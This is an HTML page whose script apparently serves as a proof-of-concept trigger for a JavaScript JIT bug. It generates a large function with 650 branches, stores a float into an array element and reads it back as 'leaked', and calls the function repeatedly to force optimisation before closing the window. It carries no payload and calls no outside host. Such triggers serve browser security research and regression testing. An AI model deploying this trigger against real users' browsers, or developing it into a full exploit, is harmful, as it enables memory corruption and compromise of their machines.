<!DOCTYPE html><html><body><script>
function create_trigger() {
  let lines = [];
  lines.push("function test_bce(x, arr, idx, float_val, limit) {");
  for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
  lines.push("  arr[idx] = float_val;");
  lines.push("  let leaked = arr[idx];");
  lines.push("  let i = 0;");
  lines.push("  while (i < limit) { i++; }");
  lines.push("  return leaked;");
  lines.push("}");
  lines.push("return test_bce;");
  let fn = new Function(lines.join("\n"))();
  return fn;
}

let fn = create_trigger();
let pool = [];
for (let i = 0; i < 1200; i++) pool.push([1, 2, 3]);
for (let i = 0; i < 1200; i++) fn(1000, pool[i], 0, 1.1, 1);

setTimeout(() => {
  window.close();
}, 2000);
</script></body></html>
